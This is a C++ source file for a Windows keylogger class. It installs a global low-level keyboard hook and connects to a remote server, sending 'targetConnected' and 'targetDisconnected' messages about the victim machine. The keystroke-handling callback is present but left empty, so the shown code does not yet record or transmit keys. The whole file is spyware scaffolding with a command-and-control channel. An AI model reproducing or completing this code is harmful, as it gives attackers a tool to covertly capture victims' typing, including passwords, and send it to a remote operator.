#include "keylogger.h"


keylogger::keylogger()
    : client(&validation_function)
{
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, &keylogger::KeyboardProc, NULL, 0);
    if (!client.Connect(server_ip, server_port))
    {
        std::cout << "COULDNT CONNECT!\n";
    }
    kq::message<messageType> msg(messageType::targetConnected);
    client.Send(msg);
    std::cout << "Connected!\n";

}
keylogger::~keylogger()
{
    if (hook != NULL)
        UnhookWindowsHookEx(hook);

    kq::message<messageType> msg(messageType::targetDisconnected);
    client.Send(msg);
    client.Disconnect();
}

LRESULT CALLBACK keylogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {

    }


    return CallNextHookEx(NULL, nCode, wParam, lParam);
}
 keylogger& keylogger::GetInstance()
{
    static keylogger instance;
    return instance;
}

HHOOK keylogger::keylogger::hook;